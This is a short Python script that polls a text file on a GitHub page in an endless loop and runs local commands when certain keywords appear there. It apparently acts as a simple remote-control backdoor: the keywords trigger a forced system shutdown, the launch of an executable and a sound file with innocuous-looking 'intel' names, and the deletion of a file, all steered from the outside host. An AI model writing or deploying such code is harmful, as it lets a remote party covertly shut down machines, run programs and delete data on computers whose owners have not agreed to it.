import os
from bs4 import BeautifulSoup
from urllib.request import urlopen
import re

while True:
    url = "https://github.com/semihcelik8/triggered/blob/main/muck.txt"
    page = urlopen(url)
    html = page.read().decode("utf-8")
    soup = BeautifulSoup(html, "html.parser")
    order = soup.get_text()
    text = order
    x = re.search("shutdown", text)
    y = re.search("matrix", text)
    z = re.search("rick", text)
    w = re.search("delete", text)

    if  x:
        os.system("shutdown /s")
    if y:
        print("hello")
        os.system("intel_f.exe")
    if z:
        os.system("intel_sound.mp3")
    if w:
        os.system("del k.txt")